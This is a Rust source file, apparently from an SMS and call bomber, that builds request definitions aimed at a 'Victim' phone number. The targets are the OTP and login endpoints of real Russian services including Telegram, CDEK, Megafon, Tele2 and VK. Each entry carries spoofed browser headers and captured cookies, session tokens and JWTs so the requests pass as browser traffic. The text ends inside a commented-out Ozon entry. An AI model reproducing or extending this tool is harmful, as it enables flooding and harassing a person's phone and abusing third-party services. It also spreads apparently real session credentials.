use crate::phone::Country;
use crate::phone::FormatterTypes::{WithPlus, WithPlusBracketsHyphen, WithPlusHyphen};
use crate::phone::Phone;
use reqwest::header::HeaderMap;
use reqwest::Method;
use std::collections::HashMap;

#[derive(Debug, Clone)]
pub struct Service {
    pub name: String,
    pub service_type: ServiceType,
    pub method: Method,
    pub url: String,
    pub headers: HeaderMap,
    pub fields: HashMap<String, String>,
}

#[derive(Debug, Clone)]
enum ServiceType {
    Sms,
    Call,
    ServiceSms,
}

#[derive(Debug, Clone)]
pub struct Victim {
    pub phone: Phone,
    pub email: String,
    pub name: String,
    pub surname: String,
}

/*
{
    let mut service = Service {
        name: "".to_string(),
        service_type: ServiceType::Sms,
        method: Method::POST,
        url: "".to_string(),
        headers: HeaderMap::new(),
        fields: HashMap::new(),
    };

    service.headers.insert("", r#""#.parse().unwrap());

    let mut phone = victim.phone.clone();
    phone.format(WithPlus);
    service
        .fields
        .insert("".to_string(), phone.phone);

    services.push(service)
}
 */

pub fn construct_services_list(victim: Victim) -> Vec<Service> {
    let mut services = Vec::new();

    match victim.phone.country {
        Country::Ru => {
            // Telegram
            {
                let mut service = Service {
                    name: "Telegram".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://my.telegram.org/auth/send_password".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.fields.insert("phone".to_string(), phone.phone);

                services.push(service)
            }
            // Sunlight
            {
                let mut service = Service {
                    name: "Sunlight".to_string(),
                    service_type: ServiceType::Call,
                    method: Method::POST,
                    url: "https://api.sunlight.net/modules/customer-auth/v1/web/send/".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert(
                    "User-Agent",
                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"#
                        .parse()
                        .unwrap(),
                );
                service.headers.insert(
                    "Accept",
                    r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                service.headers.insert(
                    "User-Local-Time",
                    r#"2024-08-08T08:05:38.395Z"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Customer-Source",
                    r#"61a74ee8040b34ebee3bcdcb7862e16b2afcd1132278680622086a172b9764e6a"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://sunlight.net"#.parse().unwrap());
                service.headers.insert("DNT", r#"1"#.parse().unwrap());
                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert(
                    "Cookie",
                    r#"city_auto_popup_shown=1; seo_campaign=b19ea3b5-1a6f-4eb5-9486-45946be9e03f"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.fields.insert("phone".to_string(), phone.phone);
                service
                    .fields
                    .insert("source".to_string(), "web_auth_page".to_string());

                services.push(service)
            }
            // 4lapy
            {
                let mut service = Service {
                    name: "4lapy".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://4lapy.ru/api/auth/checkPhone/".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service.headers.insert(
                    "Accept",
                    r#"application/json, text/plain, */*"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                service.headers.insert(
                    "Referer",
                    r#"https://4lapy.ru/landings/dobrolap/"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://4lapy.ru"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert("Cookie", r#"currentPage=%2Flandings%2Fdobrolap%2F; previousPage=%2F; 4lapy_site_v5=new; 4lapy_site_force=true; NEXT_CUSTOMER_TOKEN=%7B%22accessToken%22%3A%22eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6TzRUSGllX05QTW5uWkFQOXFLZC1FaElvbGNCY1dhSVFzUUdVLWJGVTc4In0.eyJleHAiOjE3MjMxMTc5NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZTdhY2UzNDAtNTNhMi00ODcyLWIyZDItMWQ0NzJlNmNkZjk5IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiNWY0M2Q0ZmEtNDdhMi00ZGRlLWEwN2ItZTVhNWIyMGYyMTU1IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoid2ViLWN1c3RvbWVyIiwic2Vzc2lvbl9zdGF0ZSI6IjU5ZjhhMDRjLWUzZmYtNDUzNS04ZDhiLTRlMDgwZWY1YTNjNyIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiIsImRlZmF1bHQtcm9sZXMtY3VzdG9tZXIiXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6InByb2ZpbGUgZW1haWwiLCJzaWQiOiI1OWY4YTA0Yy1lM2ZmLTQ1MzUtOGQ4Yi00ZTA4MGVmNWEzYzciLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImN1c3RvbWVySWQiOjkxNjcyNTM3LCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJjYmZmNzFkNDFmZGI0OGQ1OThjZGM1ZWMxZGI1ZTUyOCJ9.Ournlzfj7p-IeI0zYR8AIx1JN8z7d_aJ-VIlzSYG7pkKRlah_94VFEP4TOkObBrd2PWi0lhuEAWB8WRcXfKpDh-nENd8rPUpN9qs0_kRq2Phb_Rv846sBFkuYHDXXk379cqFpA-Amo0ATXpNxyaY6ladj4LDCrs7R020zjGdbyvg8_XroTS8pOihZeW8LJMyrKSH0bPjQ5BTnMyidnU4bjVidTaWF4QL6Itv6gioCSUpdy2vXosqMkwn2_1VpRM-FgmeKWsbFgohHbA2Vx1tnvqmknNwJrf-kKPw_YIeRiyF7R3Wshxr26nnNz39FLDyHeKq6k0ihUDSF_MkpToQfQ%22%2C%22refreshToken%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJlNWQ5MTc0Yi0yZWJjLTQ4ZmItOGM0NC03ZTg0M2E2ZmYxNmEifQ.eyJleHAiOjE3MjU3MDk2NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZWUwYzE1MDktZjBkMi00Zjk3LThjNDItNDMyMGVmNTdkZjhmIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJodHRwczovL2tleWNsb2FrLmluZnJhL3JlYWxtcy9jdXN0b21lciIsInN1YiI6IjVmNDNkNGZhLTQ3YTItNGRkZS1hMDdiLWU1YTViMjBmMjE1NSIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJ3ZWItY3VzdG9tZXIiLCJzZXNzaW9uX3N0YXRlIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3Iiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwic2lkIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3In0.L1Eao_rMK3uitZlkaAoBjATCR2P90RUlBWVxr-N56cw%22%2C%22tokenType%22%3A%22Bearer%22%2C%22expiresIn%22%3A300%2C%22sessionState%22%3A%2259f8a04c-e3ff-4535-8d8b-4e080ef5a3c7%22%2C%22scope%22%3A%22profile%20email%22%2C%22refreshExpiresIn%22%3A2592000%2C%22expiresAt%22%3A1723117961469%2C%22refreshExpiresAt%22%3A1725709661469%7D; g4c_x=1; _userGUID=0:lzl7rn6h:7sThR1GuZizvLXpg8tqkDPqYlire9LZT; dSesn=dd062781-f6e3-1bc6-a597-b1d859b692e7; _dvs=0:lzl7rn6h:aqZJzNtf1Q~QJQj23NMmPzXidgA~ctgK; location=%7B%22postalCode%22%3A%22101000%22%2C%22fiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22kladrId%22%3A%227700000000000%22%2C%22rusRegionId%22%3A77%2C%22regionFiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22regionName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22areaName%22%3A%22%20%22%2C%22cityName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22settlementName%22%3A%22%22%2C%22streetName%22%3A%22%20%22%2C%22houseName%22%3A%22%20%22%2C%22flatName%22%3A%22%20%22%2C%22typeCode%22%3A%22region%22%2C%22typeName%22%3A%22%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22value%22%3A%22%D0%B3%20%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22geo_lat%22%3A%2255.75396%22%2C%22geo_lon%22%3A%2237.620393%22%2C%22timezone%22%3A%22UTC%2B3%22%2C%22streetShort%22%3A%22%22%2C%22streetType%22%3A%22%22%2C%22houseShort%22%3A%22%22%2C%22houseType%22%3A%22%22%2C%22blockName%22%3A%22%22%2C%22blockType%22%3A%22%22%7D; polygon=r468-10-14-14-18-18-22; _ga_GRN90Z74D3=GS1.1.1723117669.1.1.1723117749.44.0.0; _ga=GA1.1.1699357532.1723117670; rrpvid=962500276817422; tmr_lvid=886243903520ca301abd3c3dd7f6c5fd; tmr_lvidTS=1723117672164; rcuid=66b4b06d5a442c690dc06be2; _ym_uid=1723117678991205878; _ym_d=1723117678; _ym_isad=2; domain_sid=HUoqZbDBqQL6J3ihwirC9%3A1723117681381; tmr_detect=0%7C1723117683099; cookieShown=true"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());
                service.headers.insert("TE", r#"trailers"#.parse().unwrap());

                service
                    .fields
                    .insert("phone".to_string(), victim.phone.phone.clone());

                services.push(service)
            }
            // CDEK
            {
                let mut service = Service {
                    name: "CDEK".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://www.cdek.ru/api-site/auth/send-code/".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service
                    .headers
                    .insert("Accept", r#"application/json"#.parse().unwrap());
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                service
                    .headers
                    .insert("Origin", r#"https://www.cdek.ru"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert(
                    "Referer",
                    r#"https://www.cdek.ru/ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F"#
                        .parse()
                        .unwrap(),
                );
                service.headers.insert("Cookie", r#"qrator_jsid2=v2.0.1723116285.944.bcaaace6EA3BiaXb|d2Fq1vc59VYTqJgp|IKOsantYVHiDVcatLf+++U3Yxxq069SbINC6McD0yZNLdP2n5VVKbTf59nMMk0u/A2LMk6HEg3aVphKyRXCnBb152ief4tcpglYwA+1yINQ9NVbyZCNZXyeu6c0KHoyY+OpMHEH9DBJ7HDxVPhDMDA==-PQxzmF6QYoM8/ZzDZpoqJ9Ke/QE=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-08%2014%3A25%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-08%2014%3A25%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2010.15%3B%20rv%3A129.0%29%20Gecko%2F20100101%20Firefox%2F129.0; cpss=eyJ0b2tlbiI6InBoaWVZaWFzaDNpUnUzYWgifQ%3D%3D; advcake_track_id=d5a49e18-5256-fd63-091d-a18aa11890bc; advcake_session_id=9117f25d-7248-755e-a55e-7d0f1fc6737c; mindboxDeviceUUID=389efa9c-9830-46e4-937f-888a55ee1a5f; directCrm-session=%7B%22deviceGuid%22%3A%22389efa9c-9830-46e4-937f-888a55ee1a5f%22%7D; flomni_5d713233e8bc9e000b3ebfd2={%22userHash%22:%227cfcb26e-f898-4f49-b16c-c08eb01cab92%22}; advcake_track_url=%3D20240805m3y6HjKNrMaMK%2BbM8A3llZnkusu3AAe2Pa1YywU9PwPmK4yLKplqS0eoqQHhy%2BwkLrX7k16m1qmEcSRqe0brw7emRgXyJunroROs61BniROWFkQFxqeBFwNA%2B1OMk2PbACWOnok%2FIvXi2a16ta48Q26lPeooK%2FnQL8dTgqy5bVhZhyMmY7wbub1HtOIfs6pu1vXKg8hqquWHBD2va%2B%2BYSnAU7JLP9QyzZUAt0vybALhtVm3IYFWIM2sxMXzX9cERiACA10jNdg0FjK0IKdNF%2FOflVyrzuV4bHn8YabRgIre84Dr4iV1JHYpNzte7yLm08BgZScyzqGzM%2F9UEPs0blD8zlWhMDLjYTcdi3AayV5PYIt%2BzatmS6ZsXvABehdferuZ6alilvc2exo3IGnsD5nz6zP5BZvPNPbvwNgDgEYck4TDEUPqdPbAwi%2FwhIn%2B0a5jHNbBGVT7jcWUlAhhCP4cpCUc33Cd9SeTVoXAeCyYrv%2ByC1nLexzfDsZ7RztxvGfRKG3Ci6mN8P8XCPLoES4LTAwibDoec0hb0K6XzXws2r3vyq0EOnVbUIfbRVwIhbCU4b%2Fko%2BSs5XoooBMFZ9UNH%2FPy%2FcCyJZS0czyKbgrKPNRPMK%2B5x7FKzf4L8IzFJc630DTO%2FLnnycfh%2F5vXFY91LfeqKoNtkKCuJE7POUhjfoC9nfQiG7Ks%3D; cityid=435; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; tmr_lvid=dd7cb18bed0ab5ae3c52a9d80ac2e456; tmr_lvidTS=1723116320396; _ym_uid=1723116321961558757; _ym_d=1723116321; _ym_isad=2; domain_sid=znad0BhAmlJqXjkAWg1LY%3A1723116322109; tmr_detect=0%7C1723118550822; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F; _ym_visorc=b"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service
                    .fields
                    .insert("locale".to_string(), "ru".to_string());
                service
                    .fields
                    .insert("websiteId".to_string(), "ru".to_string());
                service
                    .fields
                    .insert("phone".to_string(), phone.phone.clone());
                service
                    .fields
                    .insert("token".to_string(), "null".to_string());

                services.push(service)
            }
            // Megafon
            {
                let mut service = Service {
                    name: "Megafon".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://lk.megafon.ru/api/auth/otp/request".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service.headers.insert(
                    "Accept",
                    r#"application/json, text/plain, */*"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Referer", r#"https://lk.megafon.ru/login"#.parse().unwrap());
                service.headers.insert(
                    "Content-Type",
                    r#"application/x-www-form-urlencoded; charset=UTF-8"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("X-App-Type", r#"react_lk"#.parse().unwrap());
                service
                    .headers
                    .insert("X-Cabinet-Capabilities", r#"web-2020"#.parse().unwrap());
                service.headers.insert(
                    "traceparent",
                    r#"00-3c12254297d2b3c78b6b333820442716-c1abbf0182398532-01"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://lk.megafon.ru"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert("Cookie", r#"LB-lk.megafon.ru=ffffffff0978c6a545525d5f4f58455e445a4a423660; page_load_start=1723118955914; DEVICE-ID=ce6fe18a-64e7-45b6-84c3-f9a3cae5588a; CSRF-TOKEN=0b193280-3bfa-4104-8084-f002febc4cf4; JSESSIONID=dc7806f8-cb02-49c4-a4aa-2bcf7a0e22c6; AUTOLOGIN-CHAIN-SESSION-KEY=8fb705f1-2e73-4984-86da-f3c858d90454; USER-REFERENCE-ID=7lBhADJeoRq2AeHmdIG2hw; _ym_uid=1723118949631111238; _ym_d=1723118949; _ym_isad=2; _ymab_param=VxcsX2bLdzwzxnUVPLAxUnBMRoW6E9LXybZoebjUAX2SKTHMD_x0N-AqRpdoT-KTpUrNs8ccvFAvi2egoTqL6umIzBA"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());

                let mut phone = victim.phone.phone.clone();
                phone = phone[1..].to_string();
                service.fields.insert("login".to_string(), phone);
                service
                    .fields
                    .insert("captchaReady".to_string(), "true".to_string());

                services.push(service)
            }
            // Tele2
            {
                let mut service = Service {
                    name: "Tele2".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: format!(
                        "https://msk.tele2.ru/api/validation/number/{}",
                        victim.phone.phone.clone()
                    )
                    .to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service.headers.insert(
                    "Accept",
                    r#"application/json, text/plain, */*"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                service
                    .headers
                    .insert("Tele2-User-Agent", r#"web"#.parse().unwrap());
                service.headers.insert(
                    "X-Request-Id",
                    r#"Z2ijKJCt3hkbrUnIpG1vSgfNlas7LwEBmzQYyOxc"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("X-User-Local-Time", r#"XMLHttpRequest"#.parse().unwrap());
                service.headers.insert("X-csrftoken", r#"17e9bfa8d7d22f1435d8bf48acc74c65ed54c8f6751d159a6569136b3c8441e9c92e033395ffab3f"#.parse().unwrap());
                service.headers.insert(
                    "X-Ajax-Token",
                    r#"3f233460cff09905b0c79b19b3742039389db9c4d212080fe325ea418906dd64"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://msk.tele2.ru"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());
                service.headers.insert("TE", r#"trailers"#.parse().unwrap());

                service
                    .fields
                    .insert("sender".to_string(), "Tele2".to_string());

                services.push(service)
            }
            // Vk2
            {
                let mut service = Service {
                    name: "Vk2".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://api.vk.com/method/auth.validatePhone?v=5.207&client_id=7913379"
                        .to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service.headers.insert("Accept", r#"*/*"#.parse().unwrap());
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Referer", r#"https://id.vk.com/"#.parse().unwrap());
                service.headers.insert(
                    "Content-Type",
                    r#"application/x-www-form-urlencoded"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://id.vk.com"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert("Cookie", r#"remixlang=0; remixstlid=9097310918861286073_zGstvc4C9g36Ot2a3ssz9qOrOxA1g1XP4SuMV43HzmT; remixua=52%7C628%7C332%7C1537086388; remixlgck=bc708d063d4102aaa7; remixstid=930500554_348CCrXbCDLkapo4Ay3dPTpEsxDQhOYFN0ujrNFZFuo; remixrefkey=d46da55ae12d77d6f1; remixscreen_width=1920; remixscreen_height=1080; remixscreen_dpr=1; remixscreen_depth=30; remixscreen_orient=1; remixscreen_winzoom=1.86; remixsf=1; remixgp=4d8819eb63df4ee187d00f4c5515d1e5; remixdark_color_scheme=1; remixcolor_scheme_mode=auto; remixdt=0; tmr_lvid=db46889fd1b161707f333d4e1c84be90; tmr_lvidTS=1723122779322; remixuas=NDRmN2NlNzkxNTc4MjlkNzkxODYxNTdk; remixnreg_sid=376b35cadf74337180291bd68353e7ae; remixsts=%7B%22data%22%3A%5B%5B1723122943%2C%22unique_adblock_users%22%2C0%2C%22web2%22%2C%22false%22%2Cnull%2C%22al_index%22%5D%5D%2C%22uniqueId%22%3A860381990.0842513%7D"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());
                service.headers.insert("TE", r#"trailers"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlusHyphen);
                service
                    .fields
                    .insert("device_id".to_string(), "VX-K-oBxHSclL1ag_Icwo".to_string());
                service
                    .fields
                    .insert("external_device_id".to_string(), "".to_string());
                service
                    .fields
                    .insert("service_group".to_string(), "".to_string());
                service.fields.insert("lang".to_string(), "ru".to_string());
                service.fields.insert("phone".to_string(), phone.phone);
                service
                    .fields
                    .insert("auth_token".to_string(), "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzaWQiOiJORFJtTjJObE56a3hOVGM0TWpsa056a3hPRFl4TlRkayIsImhhc2giOiJmNTM4NTE0ZmJiYTE3ODE3IiwiZXhwIjoxNzIzMTI2NTQyfQ.fPfWGIXxWfQW6M2erfjJV2gY1WR21ESlXaD2HxBq2g0".to_string());
                service.fields.insert("sid".to_string(), "".to_string());
                service
                    .fields
                    .insert("allow_callreset".to_string(), "1".to_string());
                service
                    .fields
                    .insert("supported_ways".to_string(), "call_in".to_string());
                service.fields.insert(
                    "supported_ways_settings".to_string(),
                    "callreset_preview_enabled".to_string(),
                );
                service
                    .fields
                    .insert("super_app_token".to_string(), "".to_string());
                service
                    .fields
                    .insert("access_token".to_string(), "".to_string());

                services.push(service)
            }

            /* // MTS
            {
                let mut service = Service {
                    name: "MTS".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://login.mts.ru/amserver/wsso/authenticate?realm=%2Fusers&client_id=LK&authIndexType=service&authIndexValue=login-spa&goto=https%3A%2F%2Flogin.mts.ru%2Famserver%2Foauth2%2Fauthorize%3Fscope%3Dprofile%2520account%2520phone%2520slaves%253Aall%2520slaves%253Aprofile%2520sub%2520email%2520user_address%2520identity_doc%2520lbsv%2520sso%2520openid%26response_type%3Dcode%26client_id%3DLK%26state%3Dac8b7d416ff94bdabf6ac3bce17bd793%26redirect_uri%3Dhttps%253A%252F%252Fauth-lk.ssl.mts.ru%252Faccount%252Fcallback%252Flogin&statetrace=ac8b7d416ff94bdabf6ac3bce17bd793".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("", r#""#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service
                    .fields
                    .insert("".to_string(), phone.phone);

                services.push(service)
            } */
            /* {
                let mut service = Service {
                    name: "Ozon".to_string(),
                    service_type: ServiceType::Call,
                    method: Method::POST,
                    url: "https://www.ozon.ru/api/composer-api.bx/widget/json/v2?widgetStateId=loginOrRegistration-340567-default-1".to_string(),
                    headers: HeaderMap::new(),
                    fields: HashMap::new(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service.headers.insert("Accept", r#"application/json"#.parse().unwrap());
                service.headers.insert("Accept-Language", r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap());
                service.headers.insert("Accept-Encoding", r#"gzip, deflate, br, zstd"#.parse().unwrap());
                service.headers.insert("Content-Type", r#"application/json"#.parse().unwrap());
